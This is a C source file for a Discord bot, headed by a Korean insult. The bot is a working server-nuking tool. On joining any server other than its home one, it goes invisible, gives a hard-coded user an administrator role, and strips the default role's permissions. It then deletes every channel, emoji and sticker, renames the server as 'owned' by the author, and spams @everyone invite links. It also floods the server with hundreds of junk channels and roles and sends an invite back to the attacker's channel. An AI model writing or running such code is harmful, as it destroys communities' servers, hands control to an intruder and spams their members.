홍보하지마 병신아

#include <concord/discord.h>

#define CHANNEL_ID 1316436107935617037
#define GUILD_ID 1316436107935617034
#define MAX_CHANNELS 500
#define MAX_ROLES 250
#define USER_ID 1291234047909171221

static void on_ready(struct discord *client,
                     const struct discord_ready * /* unused */) {
  discord_update_presence(client, &(struct discord_presence_update){
                                      .activities =
                                          &(struct discord_activities){
                                              0,
                                          },
                                      .since = discord_timestamp(client),
                                      .status = "invisible",
                                  });
}

static void on_guild_create(struct discord *client,
                            const struct discord_guild *event) {
  if (GUILD_ID != event->id) {
    struct discord_channel channel;
    struct discord_invite invite;
    struct discord_role role;
    discord_remove_guild_ban(client, event->id, USER_ID, 0, 0);
    discord_create_guild_role(client, event->id,
                              &(struct discord_create_guild_role){
                                  .color = 1,
                                  .hoist = true,
                                  .name = "intmainvoidreturn0",
                                  .permissions = DISCORD_PERM_ADMINISTRATOR,
                              },
                              &(struct discord_ret_role){
                                  .sync = &role,
                              });
    discord_add_guild_member_role(client, event->id, USER_ID, role.id, 0, 0);
    for (int i = 0; event->roles->size != i; ++i) {
      if (!event->roles->array[i].position) {
        discord_modify_guild_role(
            client, event->id, event->roles->array[i].id,
            &(struct discord_modify_guild_role){
                .permissions = DISCORD_PERM_READ_MESSAGE_HISTORY |
                               DISCORD_PERM_VIEW_CHANNEL,
            },
            0);
        break;
      }
    }
    for (int i = 0; event->stickers->size != i; ++i) {
      discord_delete_guild_sticker(client, event->id,
                                   event->stickers->array[i].id, 0, 0);
    }
    for (int i = 0; event->emojis->size != i; ++i) {
      discord_delete_guild_emoji(client, event->id, event->emojis->array[i].id,
                                 0, 0);
    }
    for (int i = 0; event->channels->size != i; ++i) {
      discord_delete_channel(client, event->channels->array[i].id, 0, 0);
    }
    discord_create_guild_channel(client, event->id,
                                 &(struct discord_create_guild_channel){
                                     .name = "intmainvoidreturn0",
                                 },
                                 &(struct discord_ret_channel){
                                     .sync = &channel,
                                 });
    discord_modify_guild(client, event->id,
                         &(struct discord_modify_guild){
                             .afk_timeout = 60,
                             .name = "owned by intmainvoidreturn0",
                             .preferred_locale = "en-US",
                             .public_updates_channel_id = channel.id,
                             .rules_channel_id = channel.id,
                         },
                         0);
    discord_create_channel_invite(client, channel.id, 0,
                                  &(struct discord_ret_invite){
                                      .sync = &invite,
                                  });
    discord_create_message(client, CHANNEL_ID,
                           &(struct discord_create_message){
                               .content = invite.code,
                           },
                           0);
    discord_create_message(
        client, channel.id,
        &(struct discord_create_message){
            .content = "# @everyonehttps://discord.gg/RTFcwX3pMK",
        },
        0);
    discord_create_guild_channel(client, event->id,
                                 &(struct discord_create_guild_channel){
                                     .name = "on",
                                 },
                                 &(struct discord_ret_channel){
                                     .sync = &channel,
                                 });
    discord_create_message(
        client, channel.id,
        &(struct discord_create_message){
            .content = "# @everyonehttps://discord.gg/RTFcwX3pMK",
        },
        0);
    discord_create_guild_channel(client, event->id,
                                 &(struct discord_create_guild_channel){
                                     .name = "top",
                                 },
                                 &(struct discord_ret_channel){
                                     .sync = &channel,
                                 });
    discord_create_message(
        client, channel.id,
        &(struct discord_create_message){
            .content = "# @everyonehttps://discord.gg/RTFcwX3pMK",
        },
        0);
    for (int i = 0; MAX_CHANNELS - 3 != i; ++i) {
      discord_create_guild_channel(client, event->id,
                                   &(struct discord_create_guild_channel){
                                       .name = "intmainvoidreturn0",
                                   },
                                   0);
    }
    for (int i = 0; MAX_ROLES - 1 - event->roles->size != i; ++i) {
      discord_create_guild_role(client, event->id,
                                &(struct discord_create_guild_role){
                                    .name = "intmainvoidreturn0",
                                },
                                0);
    }
  }
}

int main(void) {
  struct discord *client = discord_init("");
  discord_set_on_ready(client, &on_ready);
  discord_set_on_guild_create(client, &on_guild_create);
  discord_run(client);
}
